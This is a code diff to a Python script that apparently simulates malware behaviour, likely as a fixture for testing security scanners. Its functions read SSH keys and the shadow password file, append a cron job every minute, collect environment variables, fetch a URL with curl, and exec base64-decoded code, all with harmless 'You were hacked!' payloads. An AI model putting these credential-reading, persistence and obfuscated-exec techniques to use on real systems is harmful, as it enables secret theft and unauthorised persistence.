@@ -31,13 +31,13 @@ def simulate_curl_malware_download():
     Simulate loading additional malware using a curl command.
     """
     try:
-        fake_url = "http://package.test"
+        fake_url = "https://wikipedia.com"
         curl_command = f"curl -s {fake_url}"
-        subprocess.Popen(curl_command)
-    except Exception:
+        subprocess.run(curl_command)
+    except Exception as e:
         pass
 
-    
+
 def access_ssh_keys():
     """
     Simulate access and modification of SSH keys.
@@ -54,7 +54,7 @@ def access_ssh_keys():
         if os.path.exists(public_key):
             with open(public_key, "rb") as f:
                 keys = f.read()
-    except Exception:
+    except Exception as e:
         pass
 
 
@@ -73,8 +73,8 @@ def access_passwords():
         if os.path.exists(shadow_file):
             with open(shadow_file, "r", encoding="utf-8") as f:
                 data = f.read()
-    except Exception:
-        pass   
+    except Exception as e:
+        pass
 
 
 def simulate_persistence():
@@ -84,14 +84,14 @@ def simulate_persistence():
     try:
         crontab_path = shutil.which("crontab")
         if crontab_path:
-            cronjob = '* * * * * echo "You were hacked!"\n'
+            cronjob = '* * * * * echo "You were hacked!1"\n'
             proc = subprocess.Popen([crontab_path, "-l"], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
             stdout, stderr = proc.communicate()
             current_cron = stdout.decode() if proc.returncode == 0 else ""
             new_cron = current_cron + cronjob
             proc = subprocess.Popen([crontab_path, "-"], stdin=subprocess.PIPE)
             proc.communicate(input=new_cron.encode())
-    except Exception:
+    except Exception as e:
         pass
 
 
@@ -105,7 +105,7 @@ def harvest_installed_packages():
         for pkg in packages:
             name = pkg.metadata['Name']
             version = pkg.version
-    except Exception:
+    except Exception as e:
         pass
 
 
@@ -120,7 +120,7 @@ def collect_system_info():
         python_version = platform.python_version()
         hostname = platform.node()
         env_vars = dict(os.environ)
-    except Exception:
+    except Exception as e:
         pass
 
 
@@ -133,7 +133,7 @@ def simulate_obfuscated_code_base64():
         # This decodes to: print("You were hacked!")
         decoded = base64.b64decode(code).decode()
         exec(decoded)
-    except Exception:
+    except Exception as e:
         pass
 
 
@@ -143,9 +143,9 @@ def simulate_obfuscated_code_binary():
     """
     try:
         source = 'print("You were hacked!")'
-        code = compile(source, '<string>', 'exec')
+        code = compile(source, '<string>', 'exec') # Todo
         exec(code)
-    except Exception:
+    except Exception as e:
         pass
 
 
@@ -163,12 +163,14 @@ simulated_techniques = [
 
 
 def main():
-  os.system("echo ' -c \"!mimikatz\'")
-  try:
-    [f("main function", True) for f in simulated_techniques]
-  except Exception as e:
-    print(f"An error occurred while executing simulated techniques: {e}")
+    # os.system("echo ' -c \"!mimikatz\'")
+    try:
+        [f() for f in simulated_techniques]
+        # with open("/temp/malicious.txt", "w", encoding="utf-8") as buffer:
+        #     buffer.write("\n".join(output))
+    except Exception as e:
+        pass
 
 
 if __name__ == "__main__":
-  main()
+    main()
